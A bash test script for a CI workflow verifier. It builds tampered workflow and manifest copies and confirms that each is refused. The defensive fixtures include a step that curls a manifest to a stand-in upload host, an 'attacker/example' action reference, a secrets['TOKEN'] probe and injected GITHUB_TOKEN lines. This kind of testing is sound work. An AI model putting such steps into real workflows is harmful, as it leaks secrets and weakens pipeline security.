#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 2 || $# -gt 3 ]]; then
  echo "usage: test-contracts.sh HARNESS SNAPSHOT [DOTFILES]" >&2
  exit 2
fi

harness=$(cd "$1" && pwd)
snapshot=$(cd "$2" && pwd)
verifier="$harness/ci/axiomlayer/verify_integration.py"
control_args=()
if [[ $# -eq 3 ]]; then
  control=$(cd "$3" && pwd)
  control_args=(--control "$control")
fi

verification_output=$(
  python3 "$verifier" --root "$harness" --source "$snapshot" "${control_args[@]}"
)
printf '%s\n' "$verification_output"

python3 - "$verifier" "$harness/.github/workflows/axiomlayer-integration.yml" <<'PY'
import importlib.util
import pathlib
import sys

spec = importlib.util.spec_from_file_location("nixpkgs_integration_verifier", sys.argv[1])
if spec is None or spec.loader is None:
    raise SystemExit("cannot load integration verifier")
verifier = importlib.util.module_from_spec(spec)
spec.loader.exec_module(verifier)
workflow = pathlib.Path(sys.argv[2]).read_text(encoding="utf-8")

authority_mutations = {
    "skippable terminal authority": workflow.replace(
        "    if: ${{ always() }}\n", "    if: ${{ success() }}\n", 1
    ),
    "partial terminal dependency set": workflow.replace(
        "      - upstream-tip\n", "", 1
    ),
    "terminal accepts skipped fleet evidence": workflow.replace(
        '          test "$FLEET_PIN_RESULT" = success\n',
        '          test "$FLEET_PIN_RESULT" = skipped\n',
        1,
    ),
    "terminal drops pull-request SHA binding": workflow.replace(
        '              test "$GITHUB_SHA" = "$PR_MERGE_COMMIT"\n', "", 1
    ),
    "policy drops event commit binding": workflow.replace(
        "          github.sha == github.event.pull_request.merge_commit_sha &&\n",
        "",
        1,
    ),
}
for label, candidate in authority_mutations.items():
    if candidate == workflow:
        raise SystemExit(f"test mutation did not change {label}")
    try:
        verifier.verify_job_authorization(candidate)
    except SystemExit:
        pass
    else:
        raise SystemExit(f"authorization verifier accepted {label}")

ambiguous = {
    "duplicate key": workflow.replace(
        "permissions:\n  contents: read\n",
        "permissions:\n  contents: read\npermissions: write-all\n",
        1,
    ),
    "anchor": workflow.replace("permissions:\n", "permissions: &shared\n", 1),
    "explicit value tag": workflow.replace(
        "  cancel-in-progress: true\n",
        "  cancel-in-progress: !!bool true\n",
        1,
    ),
    "multiple documents": workflow + "\n---\nname: shadow\n",
}
for label, candidate in ambiguous.items():
    try:
        verifier.verify_unambiguous_yaml(candidate)
    except SystemExit:
        pass
    else:
        raise SystemExit(f"strict YAML verifier accepted {label}")

flow_reference = "attacker/example@" + "0" * 40
flow = 'steps: [{"uses": "' + flow_reference + '"}]\n'
if flow_reference not in verifier.USES.findall(flow):
    raise SystemExit("flow-style Action reference bypassed the inventory parser")
PY
printf '%s\n' 'terminal_authority_adversarial=verified'
printf '%s\n' 'strict_workflow_yaml=verified'
printf '%s\n' 'flow_action_inventory=verified'

expected_control_source=minimized-binding-only
if [[ $# -eq 3 ]]; then
  expected_control_source=verified
fi
if ! grep -Fqx "control_source=$expected_control_source" <<<"$verification_output"; then
  echo "policy verifier did not report the expected control source" >&2
  exit 1
fi

temporary=$(mktemp -d)
trap 'rm -rf "$temporary"' EXIT

python3 - "$verifier" "$harness/.github/workflows/axiomlayer-integration.yml" "$temporary/terminal-authority.sh" <<'PY'
import importlib.util
import pathlib
import sys

spec = importlib.util.spec_from_file_location("nixpkgs_integration_verifier", sys.argv[1])
if spec is None or spec.loader is None:
    raise SystemExit("cannot load integration verifier")
verifier = importlib.util.module_from_spec(spec)
spec.loader.exec_module(verifier)
workflow = pathlib.Path(sys.argv[2]).read_text(encoding="utf-8")
terminal = verifier.split_job_blocks(workflow)["workflow-required"]
marker = "        run: |\n"
if terminal.count(marker) != 1:
    raise SystemExit("unexpected terminal authority run block")
body = terminal.split(marker, 1)[1]
lines = []
for line in body.splitlines():
    if not line:
        lines.append("")
        continue
    if not line.startswith("          "):
        raise SystemExit(f"unexpected terminal authority indentation: {line!r}")
    lines.append(line[10:])
pathlib.Path(sys.argv[3]).write_text("\n".join(lines) + "\n", encoding="utf-8")
PY

terminal_sha=0123456789abcdef0123456789abcdef01234567
main_workflow_ref=axiomlayer/nixpkgs/.github/workflows/axiomlayer-integration.yml@refs/heads/master
run_terminal_case() {
  env -i \
    PATH=/usr/bin:/bin \
    RUNNER_ENVIRONMENT=github-hosted \
    GITHUB_SERVER_URL=https://github.com \
    GITHUB_REPOSITORY=axiomlayer/nixpkgs \
    EVENT_REPOSITORY=axiomlayer/nixpkgs \
    EVENT_DEFAULT_BRANCH=master \
    POLICY_RESULT=success \
    FLEET_PIN_RESULT=success \
    EVENT_SHA="$terminal_sha" \
    GITHUB_SHA="$terminal_sha" \
    GITHUB_BASE_REF= \
    GITHUB_REF_PROTECTED= \
    PR_HEAD_REPOSITORY= \
    PR_NUMBER= \
    PR_MERGE_COMMIT= \
    PUSH_AFTER= \
    "$@" \
    bash "$temporary/terminal-authority.sh"
}

run_terminal_case \
  GITHUB_EVENT_NAME=pull_request \
  RESOLVE_UPSTREAM_RESULT=skipped \
  UPSTREAM_TIP_RESULT=skipped \
  GITHUB_BASE_REF=master \
  PR_HEAD_REPOSITORY=axiomlayer/nixpkgs \
  PR_NUMBER=7 \
  PR_MERGE_COMMIT="$terminal_sha" \
  GITHUB_REF=refs/pull/7/merge \
  GITHUB_WORKFLOW_REF=axiomlayer/nixpkgs/.github/workflows/axiomlayer-integration.yml@refs/pull/7/merge

run_terminal_case \
  GITHUB_EVENT_NAME=push \
  RESOLVE_UPSTREAM_RESULT=skipped \
  UPSTREAM_TIP_RESULT=skipped \
  PUSH_AFTER="$terminal_sha" \
  GITHUB_REF=refs/heads/master \
  GITHUB_REF_PROTECTED=true \
  GITHUB_WORKFLOW_REF="$main_workflow_ref"

for terminal_event in schedule workflow_dispatch; do
  run_terminal_case \
    GITHUB_EVENT_NAME="$terminal_event" \
    RESOLVE_UPSTREAM_RESULT=success \
    UPSTREAM_TIP_RESULT=success \
    GITHUB_REF=refs/heads/master \
    GITHUB_REF_PROTECTED=true \
    GITHUB_WORKFLOW_REF="$main_workflow_ref"
done

if run_terminal_case \
  GITHUB_EVENT_NAME=pull_request \
  RESOLVE_UPSTREAM_RESULT=success \
  UPSTREAM_TIP_RESULT=skipped \
  GITHUB_BASE_REF=master \
  PR_HEAD_REPOSITORY=axiomlayer/nixpkgs \
  PR_NUMBER=7 \
  PR_MERGE_COMMIT="$terminal_sha" \
  GITHUB_REF=refs/pull/7/merge \
  GITHUB_WORKFLOW_REF=axiomlayer/nixpkgs/.github/workflows/axiomlayer-integration.yml@refs/pull/7/merge \
  >/dev/null 2>&1; then
  echo "terminal authority accepted invalid pull-request result routing" >&2
  exit 1
fi
printf '%s\n' 'terminal_event_result_routing=verified'

copy_static_fixture() {
  destination=$1
  mkdir -p "$destination/ci"
  cp -R "$harness/.github" "$destination/.github"
  cp -R "$harness/ci/axiomlayer" "$destination/ci/axiomlayer"
}

expect_workflow_refusal() {
  fixture=$1
  label=$2
  if python3 "$verifier" \
    --mode workflows \
    --root "$fixture" \
    --baseline-repository "$harness" \
    >/dev/null 2>&1; then
    echo "workflow verifier accepted $label" >&2
    exit 1
  fi
  printf '%s=verified\n' "$label"
}

copy_static_fixture "$temporary/workflow"
printf '\npermissions:\n  contents: write\n' >>"$temporary/workflow/.github/workflows/axiomlayer-integration.yml"
expect_workflow_refusal "$temporary/workflow" write_authority_refusal

copy_static_fixture "$temporary/private-control"
python3 - "$temporary/private-control/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "          path: integration\n"
if value.count(needle) != 3:
    raise SystemExit("unexpected integration checkout count")
value = value.replace(
    needle,
    "          repository: AxiomLayer/dotfiles\n" + needle,
    1,
)
path.write_text(value, encoding="utf-8")
PY
expect_workflow_refusal "$temporary/private-control" private_control_checkout_refusal

copy_static_fixture "$temporary/pin"
python3 - "$temporary/pin/.github/axiomlayer/fleet-pin.json" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = json.loads(path.read_text(encoding="utf-8"))
value["fleetPin"]["commit"] = "0" * 40
path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")
PY
if python3 "$verifier" --mode policy --root "$temporary/pin" --source "$snapshot" "${control_args[@]}" >/dev/null 2>&1; then
  echo "policy verifier accepted a changed fleet pin" >&2
  exit 1
fi
printf '%s\n' 'fleet_pin_drift_refusal=verified'

copy_static_fixture "$temporary/archive"
printf '\n# changed\n' >>"$temporary/archive/.github/upstream-archive/workflows/bot.yml"
expect_workflow_refusal "$temporary/archive" upstream_archive_drift_refusal

copy_static_fixture "$temporary/archive-omission"
rm "$temporary/archive-omission/.github/upstream-archive/dependabot.yml"
expect_workflow_refusal "$temporary/archive-omission" upstream_archive_omission_refusal

copy_static_fixture "$temporary/live-config"
cp \
  "$temporary/live-config/.github/upstream-archive/dependabot.yml" \
  "$temporary/live-config/.github/dependabot.yml"
expect_workflow_refusal "$temporary/live-config" inherited_live_config_refusal

copy_static_fixture "$temporary/baseline"
python3 - "$temporary/baseline/.github/axiomlayer/fleet-pin.json" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = json.loads(path.read_text(encoding="utf-8"))
value["upstreamArchive"]["baselineCommit"] = "0" * 40
path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")
PY
expect_workflow_refusal "$temporary/baseline" upstream_baseline_drift_refusal

copy_static_fixture "$temporary/second-workflow"
printf '%s\n' 'name: unexpected' 'on: workflow_dispatch' > \
  "$temporary/second-workflow/.github/workflows/unexpected.yml"
expect_workflow_refusal "$temporary/second-workflow" second_active_workflow_refusal

copy_static_fixture "$temporary/repository-identity"
python3 - "$temporary/repository-identity/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "github.repository == 'axiomlayer/nixpkgs'"
if value.count(needle) != 4:
    raise SystemExit("unexpected repository guard count")
path.write_text(value.replace(needle, "github.repository == 'AxiomLayer/nixpkgs'", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/repository-identity" lowercase_repository_identity_refusal

copy_static_fixture "$temporary/unprotected-main"
python3 - "$temporary/unprotected-main/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "github.ref_protected == true"
if value.count(needle) != 4:
    raise SystemExit("unexpected protected-ref guard count")
path.write_text(value.replace(needle, "true", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/unprotected-main" unprotected_main_refusal

copy_static_fixture "$temporary/fork-pr"
python3 - "$temporary/fork-pr/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "github.event.pull_request.head.repo.full_name == 'axiomlayer/nixpkgs'"
if value.count(needle) != 2:
    raise SystemExit("unexpected same-repository PR guard count")
path.write_text(value.replace(needle, "github.event.pull_request.head.repo.full_name != ''", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/fork-pr" public_fork_pull_request_refusal

copy_static_fixture "$temporary/alternate-workflow-ref"
python3 - "$temporary/alternate-workflow-ref/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "axiomlayer-integration.yml@refs/heads/master"
if value.count(needle) != 5:
    raise SystemExit("unexpected protected workflow-ref count")
path.write_text(value.replace(needle, "alternate.yml@refs/heads/master", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/alternate-workflow-ref" alternate_workflow_refusal

copy_static_fixture "$temporary/self-hosted"
python3 - "$temporary/self-hosted/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "    runs-on: ubuntu-24.04\n"
if value.count(needle) != 3:
    raise SystemExit("unexpected fixed hosted-runner count")
path.write_text(value.replace(needle, "    runs-on: self-hosted\n", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/self-hosted" fleet_self_hosted_runner_refusal

copy_static_fixture "$temporary/retired-name"
retired_name=codex"_security""_gate"
printf '\n%s\n' "$retired_name" >> \
  "$temporary/retired-name/.github/axiomlayer/README.md"
expect_workflow_refusal "$temporary/retired-name" retired_name_refusal

copy_static_fixture "$temporary/retired-slug"
retired_slug=codex"-security""-gate"
printf '\n%s\n' "$retired_slug" >> \
  "$temporary/retired-slug/.github/axiomlayer/README.md"
expect_workflow_refusal "$temporary/retired-slug" retired_slug_refusal

copy_static_fixture "$temporary/wrapper-digest"
printf '\n# changed\n' >>"$temporary/wrapper-digest/ci/axiomlayer/install-nix-ci.sh"
expect_workflow_refusal "$temporary/wrapper-digest" wrapper_digest_drift_refusal

copy_static_fixture "$temporary/installer-digest"
python3 - "$temporary/installer-digest/.github/axiomlayer/fleet-pin.json" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = json.loads(path.read_text(encoding="utf-8"))
value["nix"]["installerSha256"] = "0" * 64
path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")
PY
expect_workflow_refusal "$temporary/installer-digest" installer_digest_drift_refusal

copy_static_fixture "$temporary/tarball-digest"
python3 - "$temporary/tarball-digest/.github/axiomlayer/fleet-pin.json" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = json.loads(path.read_text(encoding="utf-8"))
value["nix"]["nativeTarballSha256"]["aarch64-linux"] = "0" * 64
path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")
PY
expect_workflow_refusal "$temporary/tarball-digest" native_tarball_digest_drift_refusal

copy_static_fixture "$temporary/environment"
python3 - "$temporary/environment/ci/axiomlayer/install-nix-ci.sh" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
if value.count("env -i") != 3:
    raise SystemExit("unexpected sterile environment boundary count")
path.write_text(value.replace("env -i", "env", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/environment" environment_allowlist_removal_refusal

copy_static_fixture "$temporary/surface-environment"
python3 - "$temporary/surface-environment/ci/axiomlayer/run-surface.sh" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
if value.count("  /usr/bin/env -i \\\n") != 1:
    raise SystemExit("unexpected sterile Nix surface count")
path.write_text(
    value.replace("  /usr/bin/env -i \\\n", "  /usr/bin/env \\\n", 1),
    encoding="utf-8",
)
PY
expect_workflow_refusal "$temporary/surface-environment" surface_environment_refusal

copy_static_fixture "$temporary/surface-credential"
printf '\n%s\n' 'GITHUB_TOKEN=${GITHUB_TOKEN:-}' >> \
  "$temporary/surface-credential/ci/axiomlayer/run-surface.sh"
expect_workflow_refusal "$temporary/surface-credential" surface_credential_refusal

copy_static_fixture "$temporary/surface-impure"
python3 - "$temporary/surface-impure/ci/axiomlayer/run-surface.sh" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "  --option pure-eval true \\\n"
if value.count(needle) != 2:
    raise SystemExit("unexpected pure-eval option count")
path.write_text(value.replace(needle, "  --impure \\\n", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/surface-impure" impure_nix_evaluation_refusal

copy_static_fixture "$temporary/surface-file-mode"
python3 - "$temporary/surface-file-mode/ci/axiomlayer/run-surface.sh" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = '  --expr "$evaluation_expression" \\\n'
if value.count(needle) != 1:
    raise SystemExit("unexpected evaluator expression count")
replacement = '  --file "$harness/ci/axiomlayer/evaluate-surface.nix" \\\n'
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/surface-file-mode" mutable_nix_file_mode_refusal

copy_static_fixture "$temporary/surface-ambient-config"
python3 - "$temporary/surface-ambient-config/ci/axiomlayer/run-surface.sh" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = '    NIX_CONFIG="$nix_config" \\\n'
if value.count(needle) != 1:
    raise SystemExit("unexpected fixed Nix configuration count")
replacement = '    NIX_CONFIG="${NIX_CONFIG:-}" \\\n'
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/surface-ambient-config" ambient_nix_config_refusal

copy_static_fixture "$temporary/surface-mutable-source"
python3 - "$temporary/surface-mutable-source/ci/axiomlayer/run-surface.sh" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = 'source_store=$(clean_nix "$nix_bin" store add-path \\\n'
if value.count(needle) != 1:
    raise SystemExit("unexpected source store import count")
replacement = 'source_store="$snapshot"\n'
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/surface-mutable-source" mutable_nix_source_refusal

copy_static_fixture "$temporary/evaluation-expression"
printf '\n# changed\n' >> \
  "$temporary/evaluation-expression/ci/axiomlayer/evaluate-surface.nix"
expect_workflow_refusal "$temporary/evaluation-expression" evaluation_expression_drift_refusal

copy_static_fixture "$temporary/smoke-expression"
printf '\n# changed\n' >> \
  "$temporary/smoke-expression/ci/axiomlayer/fleet-smoke.nix"
expect_workflow_refusal "$temporary/smoke-expression" smoke_expression_drift_refusal

copy_static_fixture "$temporary/credential"
printf '\nGITHUB_TOKEN=fabricated-but-forbidden\n' >>"$temporary/credential/ci/axiomlayer/install-nix-ci.sh"
expect_workflow_refusal "$temporary/credential" credential_reference_refusal

copy_static_fixture "$temporary/delegated-bootstrap"
python3 - "$temporary/delegated-bootstrap/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "        run: sh integration/ci/axiomlayer/install-nix-ci.sh\n"
if value.count(needle) != 2:
    raise SystemExit("unexpected fleet wrapper invocation count")
replacement = (
    "        uses: cachix/install-nix-action@"
    "13d8dd58da0234aa297dedd986986ccb8e7f3e24\n"
)
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/delegated-bootstrap" delegated_bootstrap_refusal

copy_static_fixture "$temporary/checkout-credential"
python3 - "$temporary/checkout-credential/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "          persist-credentials: false\n"
if value.count(needle) != 6:
    raise SystemExit("unexpected credential-disabled checkout count")
path.write_text(value.replace(needle, "", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/checkout-credential" checkout_credential_persistence_refusal

copy_static_fixture "$temporary/checkout-event-ref"
python3 - "$temporary/checkout-event-ref/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = '          ref: ${{ github.sha }}\n'
if value.count(needle) != 3:
    raise SystemExit("unexpected event-SHA checkout count")
path.write_text(value.replace(needle, "", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/checkout-event-ref" checkout_event_sha_refusal

copy_static_fixture "$temporary/checkout-version"
python3 - "$temporary/checkout-version/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
if value.count(needle) != 6:
    raise SystemExit("unexpected exact checkout pin count")
path.write_text(value.replace(needle, needle.replace("v7.0.1", "v7.0.0"), 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/checkout-version" checkout_version_annotation_refusal

copy_static_fixture "$temporary/native-matrix"
python3 - "$temporary/native-matrix/.github/axiomlayer/fleet-pin.json" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = json.loads(path.read_text(encoding="utf-8"))
value["nativeSystems"][0]["runner"], value["nativeSystems"][1]["runner"] = (
    value["nativeSystems"][1]["runner"],
    value["nativeSystems"][0]["runner"],
)
path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")
PY
expect_workflow_refusal "$temporary/native-matrix" native_runner_system_mapping_refusal

copy_static_fixture "$temporary/write-all"
python3 - "$temporary/write-all/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "permissions:\n  contents: read"
if value.count(needle) != 1:
    raise SystemExit("unexpected top-level permission count")
path.write_text(value.replace(needle, "permissions: write-all", 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/write-all" yaml_write_all_refusal

copy_static_fixture "$temporary/spaced-write"
python3 - "$temporary/spaced-write/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "permissions:\n  contents: read"
if value.count(needle) != 1:
    raise SystemExit("unexpected top-level permission count")
path.write_text(
    value.replace(needle, "permissions :\n  contents : write", 1),
    encoding="utf-8",
)
PY
expect_workflow_refusal "$temporary/spaced-write" yaml_spaced_write_refusal

copy_static_fixture "$temporary/soft-fail"
python3 - "$temporary/soft-fail/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "      - name: Prove the immutable policy and workflow boundary\n        run:"
if value.count(needle) != 1:
    raise SystemExit("unexpected policy step count")
path.write_text(
    value.replace(
        needle,
        "      - name: Prove the immutable policy and workflow boundary\n"
        "        continue-on-error: true\n"
        "        run:",
        1,
    ),
    encoding="utf-8",
)
PY
expect_workflow_refusal "$temporary/soft-fail" policy_soft_failure_refusal

copy_static_fixture "$temporary/skipped-policy"
python3 - "$temporary/skipped-policy/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "      - name: Prove the immutable policy and workflow boundary\n        run:"
if value.count(needle) != 1:
    raise SystemExit("unexpected policy step count")
path.write_text(
    value.replace(
        needle,
        "      - name: Prove the immutable policy and workflow boundary\n"
        "        if: false\n"
        "        run:",
        1,
    ),
    encoding="utf-8",
)
PY
expect_workflow_refusal "$temporary/skipped-policy" skipped_policy_step_refusal

copy_static_fixture "$temporary/bracket-secret"
python3 - "$temporary/bracket-secret/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "    runs-on: ubuntu-24.04\n"
if value.count(needle) != 3:
    raise SystemExit("unexpected fixed hosted-runner count")
replacement = (
    "    runs-on: ubuntu-24.04\n"
    "    env:\n"
    "      PROBE: ${{ secrets['TOKEN'] }}\n"
)
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/bracket-secret" bracket_secret_refusal

copy_static_fixture "$temporary/spaced-environment"
python3 - "$temporary/spaced-environment/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "    runs-on: ubuntu-24.04\n"
if value.count(needle) != 3:
    raise SystemExit("unexpected fixed hosted-runner count")
path.write_text(
    value.replace(needle, "    environment : production\n" + needle, 1),
    encoding="utf-8",
)
PY
expect_workflow_refusal "$temporary/spaced-environment" spaced_environment_refusal

copy_static_fixture "$temporary/constructed-runner"
python3 - "$temporary/constructed-runner/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "    runs-on: ubuntu-24.04\n"
if value.count(needle) != 3:
    raise SystemExit("unexpected fixed hosted-runner count")
replacement = "    runs-on: ${{ format('{0}-{1}', 'self', 'hosted') }}\n"
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/constructed-runner" constructed_runner_refusal

copy_static_fixture "$temporary/authorization-shortcut"
python3 - "$temporary/authorization-shortcut/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "    if: >-\n      github.repository =="
if value.count(needle) != 1:
    raise SystemExit("unexpected PR-capable authorization count")
replacement = "    if: >-\n      true ||\n      github.repository =="
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/authorization-shortcut" authorization_shortcut_refusal

copy_static_fixture "$temporary/arbitrary-publication"
python3 - "$temporary/arbitrary-publication/.github/workflows/axiomlayer-integration.yml" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = "      - name: Prove the fork release branch still names the fleet pin\n"
if value.count(needle) != 1:
    raise SystemExit("unexpected release-branch proof count")
replacement = (
    "      - name: Publish elsewhere\n"
    "        run: curl --data @integration/.github/axiomlayer/fleet-pin.json "
    "https://example.invalid/upload\n"
    + needle
)
path.write_text(value.replace(needle, replacement, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/arbitrary-publication" arbitrary_publication_refusal

copy_static_fixture "$temporary/archive-root-symlink"
mv \
  "$temporary/archive-root-symlink/.github/upstream-archive" \
  "$temporary/archive-root-symlink-target"
ln -s \
  "$temporary/archive-root-symlink-target" \
  "$temporary/archive-root-symlink/.github/upstream-archive"
expect_workflow_refusal "$temporary/archive-root-symlink" archive_root_symlink_refusal

copy_static_fixture "$temporary/path-normalization"
python3 - "$temporary/path-normalization/.github/axiomlayer/fleet-pin.json" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = json.loads(path.read_text(encoding="utf-8"))
files = value["upstreamArchive"]["files"]
digest = files.pop(".github/workflows/bot.yml")
files[".github/workflows/../workflows/bot.yml"] = digest
path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")
PY
expect_workflow_refusal "$temporary/path-normalization" path_normalization_refusal

copy_static_fixture "$temporary/duplicate-manifest-key"
python3 - "$temporary/duplicate-manifest-key/.github/axiomlayer/fleet-pin.json" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = '  "fork": "axiomlayer/nixpkgs",\n'
if value.count(needle) != 1:
    raise SystemExit("unexpected manifest fork key count")
path.write_text(value.replace(needle, needle + needle, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/duplicate-manifest-key" duplicate_manifest_key_refusal

copy_static_fixture "$temporary/nonfinite-manifest"
python3 - "$temporary/nonfinite-manifest/.github/axiomlayer/fleet-pin.json" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
value = path.read_text(encoding="utf-8")
needle = '  "control": {\n'
if value.count(needle) != 1:
    raise SystemExit("unexpected control key count")
path.write_text(value.replace(needle, '  "invalid": NaN,\n' + needle, 1), encoding="utf-8")
PY
expect_workflow_refusal "$temporary/nonfinite-manifest" nonfinite_json_refusal

copy_static_fixture "$temporary/self-blessed-workflow"
python3 - "$temporary/self-blessed-workflow" <<'PY'
import hashlib
import json
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
workflow = root / ".github/workflows/axiomlayer-integration.yml"
workflow.write_text(workflow.read_text(encoding="utf-8") + "\n# drift\n", encoding="utf-8")
manifest_path = root / ".github/axiomlayer/fleet-pin.json"
manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
manifest["activeWorkflowSha256"] = hashlib.sha256(workflow.read_bytes()).hexdigest()
manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
PY
expect_workflow_refusal "$temporary/self-blessed-workflow" self_blessed_workflow_refusal

echo "tamper_refusal=verified"
